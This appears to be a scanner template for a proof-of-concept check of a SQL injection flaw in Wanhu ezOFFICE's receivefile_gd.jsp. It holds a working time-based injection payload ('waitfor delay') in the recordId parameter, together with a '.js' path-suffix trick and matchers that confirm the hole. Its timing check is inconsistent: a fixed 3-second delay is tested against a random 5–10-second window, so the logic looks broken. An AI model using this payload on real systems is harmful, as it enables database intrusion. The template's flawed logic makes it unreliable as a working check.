id: poc-yaml-wanhu-ezoffice-receivefile-gd-jsp-sqli
info:
  name: Wanhu ezOFFICE receivefile_gd.jsp SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection,ezoffice

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - raw:
      - |
        GET /defaultroot/modules/govoffice/gov_documentmanager/receivefile_gd.jsp;.js?recordId=221;waitfor+delay+%270:0:3%27--+- HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "document.all.gd.src=url"
      - type: word
        part: body
        words:
          - "正在归档中,请稍后"
      - type: dsl
        dsl:
          - "duration > to_number(t1) && duration < to_number(t2)"
